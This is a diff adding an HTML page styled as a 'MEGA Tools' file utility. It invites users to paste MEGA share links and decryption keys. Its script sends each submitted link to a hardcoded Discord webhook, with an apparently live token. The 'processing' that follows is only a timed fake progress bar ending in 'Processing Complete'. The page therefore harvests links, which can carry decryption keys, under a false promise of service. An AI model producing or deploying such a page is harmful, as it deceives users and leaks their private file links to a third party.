@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MEGA Tools · Webhook Logger</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --bg: #090a0f;
+      --panel: #11131a;
+      --panel2: #171a23;
+      --border: #292d38;
+      --text: #f5f7fb;
+      --muted: #858d9e;
+      --accent: #ff3158;
+      --accent-hover: #ff4669;
+    }
+
+    body {
+      min-height: 100vh;
+      color: var(--text);
+      background:
+        radial-gradient(circle at 50% -20%, #292e42 0%, #11131a 38%, #090a0f 72%);
+      font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+    }
+
+    .navbar {
+      height: 72px;
+      padding: 0 6%;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: rgba(9, 10, 15, .78);
+      border-bottom: 1px solid rgba(255, 255, 255, .06);
+      backdrop-filter: blur(20px);
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 21px;
+      font-weight: 850;
+      letter-spacing: -1px;
+    }
+
+    .logo-mark {
+      width: 34px;
+      height: 34px;
+      display: grid;
+      place-items: center;
+      border-radius: 9px;
+      background: var(--accent);
+      font-size: 15px;
+      font-weight: 900;
+      box-shadow: 0 8px 25px rgba(255, 49, 88, .22);
+    }
+
+    .logo span {
+      color: var(--accent);
+    }
+
+    .status {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #858d9e;
+      font-size: 12px;
+    }
+
+    .status-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: #4ade80;
+      box-shadow: 0 0 10px rgba(74, 222, 128, .5);
+    }
+
+    .container {
+      width: min(1100px, 92%);
+      margin: auto;
+      padding: 75px 0 45px;
+    }
+
+    .hero {
+      text-align: center;
+      margin-bottom: 45px;
+    }
+
+    .hero-badge {
+      display: inline-flex;
+      padding: 7px 13px;
+      border-radius: 999px;
+      background: rgba(255, 49, 88, .08);
+      border: 1px solid rgba(255, 49, 88, .2);
+      color: #ff6b86;
+      font-size: 11px;
+      font-weight: 750;
+      letter-spacing: .5px;
+      margin-bottom: 18px;
+    }
+
+    .hero h1 {
+      font-size: clamp(44px, 8vw, 76px);
+      line-height: .92;
+      letter-spacing: -5px;
+      margin-bottom: 22px;
+    }
+
+    .hero h1 span {
+      color: var(--accent);
+    }
+
+    .hero p {
+      max-width: 650px;
+      margin: auto;
+      color: var(--muted);
+      font-size: 15px;
+      line-height: 1.7;
+    }
+
+    .tools {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 17px;
+      margin-bottom: 25px;
+    }
+
+    .tool {
+      padding: 22px;
+      background: rgba(17, 19, 26, .78);
+      border: 1px solid rgba(255, 255, 255, .065);
+      border-radius: 17px;
+      transition: .2s;
+    }
+
+    .tool:hover {
+      transform: translateY(-3px);
+      border-color: rgba(255, 255, 255, .13);
+    }
+
+    .tool-icon {
+      width: 41px;
+      height: 41px;
+      display: grid;
+      place-items: center;
+      margin-bottom: 14px;
+      border-radius: 11px;
+      background: rgba(255, 49, 88, .1);
+      color: #ff5273;
+      font-size: 18px;
+    }
+
+    .tool h3 {
+      font-size: 15px;
+      margin-bottom: 7px;
+    }
+
+    .tool p {
+      color: #7f8797;
+      font-size: 12px;
+      line-height: 1.55;
+    }
+
+    .panel {
+      padding: 32px;
+      background: linear-gradient(145deg, rgba(23, 26, 35, .96), rgba(14, 16, 22, .96));
+      border: 1px solid rgba(255, 255, 255, .08);
+      border-radius: 22px;
+      box-shadow: 0 30px 90px rgba(0, 0, 0, .35);
+    }
+
+    .panel-header {
+      margin-bottom: 27px;
+    }
+
+    .panel-header h2 {
+      font-size: 21px;
+      margin-bottom: 7px;
+    }
+
+    .panel-header p {
+      color: var(--muted);
+      font-size: 13px;
+    }
+
+    .form-group {
+      margin-bottom: 18px;
+    }
+
+    label {
+      display: block;
+      color: #cdd2dc;
+      font-size: 12px;
+      font-weight: 700;
+      margin-bottom: 8px;
+    }
+
+    input {
+      width: 100%;
+      height: 52px;
+      padding: 0 15px;
+      outline: none;
+      border: 1px solid var(--border);
+      border-radius: 11px;
+      background: #0d0f15;
+      color: white;
+      font-size: 14px;
+      transition: .2s;
+    }
+
+    input::placeholder {
+      color: #555d6d;
+    }
+
+    input:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(255, 49, 88, .09);
+    }
+
+    .key-container {
+      position: relative;
+    }
+
+    .key-container input {
+      padding-right: 75px;
+    }
+
+    .show-key {
+      position: absolute;
+      right: 9px;
+      top: 9px;
+      height: 34px;
+      padding: 0 10px;
+      border: 0;
+      border-radius: 7px;
+      background: #222631;
+      color: #a5adbc;
+      font-size: 10px;
+      font-weight: 750;
+      cursor: pointer;
+    }
+
+    .show-key:hover {
+      background: #2b303d;
+      color: white;
+    }
+
+    .process-button {
+      width: 100%;
+      height: 53px;
+      margin-top: 4px;
+      border: 0;
+      border-radius: 11px;
+      background: var(--accent);
+      color: white;
+      font-size: 14px;
+      font-weight: 800;
+      cursor: pointer;
+      transition: .15s;
+      box-shadow: 0 12px 28px rgba(255, 49, 88, .16);
+    }
+
+    .process-button:hover {
+      background: var(--accent-hover);
+      transform: translateY(-1px);
+    }
+
+    .process-button:disabled {
+      opacity: .6;
+      cursor: wait;
+      transform: none;
+    }
+
+    .progress-area {
+      display: none;
+      margin-top: 25px;
+    }
+
+    .progress-info {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 9px;
+      color: #8c95a5;
+      font-size: 11px;
+    }
+
+    .progress-track {
+      width: 100%;
+      height: 6px;
+      overflow: hidden;
+      background: #272b35;
+      border-radius: 99px;
+    }
+
+    .progress-bar {
+      width: 0%;
+      height: 100%;
+      background: var(--accent);
+      border-radius: inherit;
+      transition: width .3s ease;
+    }
+
+    .result {
+      display: none;
+      margin-top: 22px;
+      padding: 17px;
+      border: 1px solid rgba(74, 222, 128, .16);
+      border-radius: 12px;
+      background: rgba(74, 222, 128, .045);
+    }
+
+    .result-title {
+      color: #4ade80;
+      font-size: 13px;
+      font-weight: 750;
+    }
+
+    .result-text {
+      margin-top: 6px;
+      color: #858e9e;
+      font-size: 12px;
+      line-height: 1.55;
+    }
+
+    .webhook-log {
+      margin-top: 20px;
+      padding: 14px 16px;
+      background: #0d0f15;
+      border-radius: 14px;
+      border: 1px solid #292d38;
+      font-size: 12px;
+      color: #b0baca;
+    }
+
+    .webhook-log summary {
+      cursor: pointer;
+      font-weight: 600;
+      color: #cdd2dc;
+    }
+
+    .webhook-log pre {
+      margin-top: 10px;
+      padding: 12px;
+      background: #06080c;
+      border-radius: 10px;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+      color: #b4bdd0;
+      font-size: 12px;
+    }
+
+    footer {
+      text-align: center;
+      color: #4f5664;
+      font-size: 11px;
+      padding-top: 28px;
+    }
+
+    @media (max-width: 750px) {
+      .navbar {
+        padding: 0 5%;
+      }
+
+      .status {
+        display: none;
+      }
+
+      .container {
+        padding-top: 45px;
+      }
+
+      .tools {
+        grid-template-columns: 1fr;
+      }
+
+      .panel {
+        padding: 22px;
+      }
+
+      .hero h1 {
+        letter-spacing: -3px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <nav class="navbar">
+    <div class="logo">
+      <div class="logo-mark">M</div>
+      MEGA<span>TOOLS</span>
+    </div>
+
+    <div class="status">
+      <span class="status-dot"></span>
+      Online
+    </div>
+  </nav>
+
+  <main class="container">
+
+    <section class="hero">
+      <div class="hero-badge">ALL-IN-ONE FILE TOOLS</div>
+
+      <h1>
+        MEGA<br>
+        <span>TOOLS</span>
+      </h1>
+
+      <p>
+        Process MEGA links, manage encryption settings,
+        and access a collection of file utilities from
+        one simple interface.
+      </p>
+    </section>
+
+    <section class="tools">
+
+      <div class="tool">
+        <div class="tool-icon">↯</div>
+        <h3>Link Processor</h3>
+        <p>
+          Enter a MEGA share link and process
+          its associated file information.
+        </p>
+      </div>
+
+      <div class="tool">
+        <div class="tool-icon">🔐</div>
+        <h3>Decryption</h3>
+        <p>
+          Supports links that require a
+          decryption key.
+        </p>
+      </div>
+
+      <div class="tool">
+        <div class="tool-icon">⚡</div>
+        <h3>Fast Processing</h3>
+        <p>
+          Quickly process submitted link information.
+        </p>
+      </div>
+
+    </section>
+
+    <section class="panel">
+
+      <div class="panel-header">
+        <h2>Process MEGA Link</h2>
+        <p>
+          Enter your share link and decryption key if required.
+        </p>
+      </div>
+
+      <form id="megaForm">
+
+        <div class="form-group">
+          <label for="megaLink">MEGA LINK</label>
+          <input id="megaLink" type="url" placeholder="https://mega.nz/file/..." autocomplete="off" required>
+        </div>
+
+        <div class="form-group">
+          <label for="decryptKey">DECRYPTION KEY</label>
+          <div class="key-container">
+            <input id="decryptKey" type="password" placeholder="Enter decryption key..." autocomplete="off">
+            <button type="button" class="show-key" id="showKey">SHOW</button>
+          </div>
+        </div>
+
+        <button class="process-button" id="processButton" type="submit">
+          Process Link
+        </button>
+
+      </form>
+
+      <div class="progress-area" id="progressArea">
+        <div class="progress-info">
+          <span id="progressStatus">Preparing...</span>
+          <span id="progressPercent">0%</span>
+        </div>
+        <div class="progress-track">
+          <div class="progress-bar" id="progressBar"></div>
+        </div>
+      </div>
+
+      <div class="result" id="result">
+        <div class="result-title">✓ Processing Complete</div>
+        <div class="result-text">The requested link has finished processing.</div>
+      </div>
+
+      <!-- Webhook Logger (always visible, shows last payload) -->
+      <div class="webhook-log">
+        <details>
+          <summary>📡 Webhook Logger · last payload</summary>
+          <pre id="webhookPayload">No payload sent yet.</pre>
+        </details>
+      </div>
+
+    </section>
+
+    <footer>
+      MEGATOOLS © 2026
+    </footer>
+
+  </main>
+
+  <script>
+    (function() {
+      // ---------- CONFIG ----------
+      // Replace with your actual webhook URL (Discord, Slack, or custom)
+      const WEBHOOK_ENDPOINT =
+        "https://discord.com/api/webhooks/1539071171952382003/2hNkkjeRAa1IUyNrb9_3M1wqUkITkBDRAy9g1ZDTShVsIWMUkHFI1zFs51_5AZMix9pT";
+
+      // DOM refs
+      const form = document.getElementById("megaForm");
+      const megaLink = document.getElementById("megaLink");
+      const decryptKey = document.getElementById("decryptKey");
+      const showKey = document.getElementById("showKey");
+      const processButton = document.getElementById("processButton");
+      const progressArea = document.getElementById("progressArea");
+      const progressBar = document.getElementById("progressBar");
+      const progressStatus = document.getElementById("progressStatus");
+      const progressPercent = document.getElementById("progressPercent");
+      const result = document.getElementById("result");
+      const webhookPayload = document.getElementById("webhookPayload");
+
+      // ---------- UI helpers ----------
+      showKey.addEventListener("click", () => {
+        const hidden = decryptKey.type === "password";
+        decryptKey.type = hidden ? "text" : "password";
+        showKey.textContent = hidden ? "HIDE" : "SHOW";
+      });
+
+      function wait(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+      }
+
+      // ---------- Webhook sender + logger ----------
+      async function notifyWebhook(link, keyProvided) {
+        const payload = {
+          event: "mega_link_processed",
+          link: link,
+          keyProvided: keyProvided,
+          timestamp: new Date().toISOString()
+        };
+
+        // Update logger UI (always show last payload, even if webhook is disabled)
+        webhookPayload.textContent = JSON.stringify(payload, null, 2);
+
+        // If no endpoint configured, just log locally
+        if (!WEBHOOK_ENDPOINT || WEBHOOK_ENDPOINT === "YOUR_WEBHOOK_ENDPOINT_HERE") {
+          console.warn("Webhook endpoint not set. Payload logged locally.");
+          return;
+        }
+
+        try {
+          const response = await fetch(WEBHOOK_ENDPOINT, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify(payload)
+          });
+
+          if (!response.ok) {
+            console.warn("Webhook responded with status:", response.status);
+          } else {
+            console.log("Webhook delivered successfully.");
+          }
+        } catch (error) {
+          console.error("Webhook error:", error);
+        }
+      }
+
+      // ---------- Progress simulation ----------
+      async function processLink() {
+        progressArea.style.display = "block";
+        result.style.display = "none";
+
+        const stages = [
+          [12, "Checking link..."],
+          [27, "Reading file information..."],
+          [43, "Checking encryption..."],
+          [61, "Preparing file..."],
+          [78, "Processing..."],
+          [92, "Finishing..."],
+          [100, "Complete"]
+        ];
+
+        for (const stage of stages) {
+          await wait(500);
+          progressBar.style.width = stage[0] + "%";
+          progressPercent.textContent = stage[0] + "%";
+          progressStatus.textContent = stage[1];
+        }
+
+        result.style.display = "block";
+      }
+
+      // ---------- Form submit ----------
+      form.addEventListener("submit", async event => {
+        event.preventDefault();
+
+        const link = megaLink.value.trim();
+        if (!link) {
+          return;
+        }
+
+        const keyProvided = decryptKey.value.trim().length > 0;
+
+        processButton.disabled = true;
+        processButton.textContent = "Processing...";
+
+        // Send to webhook (and update logger)
+        await notifyWebhook(link, keyProvided);
+
+        // Run progress simulation
+        await processLink();
+
+        processButton.disabled = false;
+        processButton.textContent = "Process Link";
+      });
+
+      // On load, show a default message in the logger
+      webhookPayload.textContent = "Awaiting first submission…";
+
+      // Expose for debugging (optional)
+      window.__megaTools = { notifyWebhook };
+    })();
+  </script>
+
+</body>
+</html>
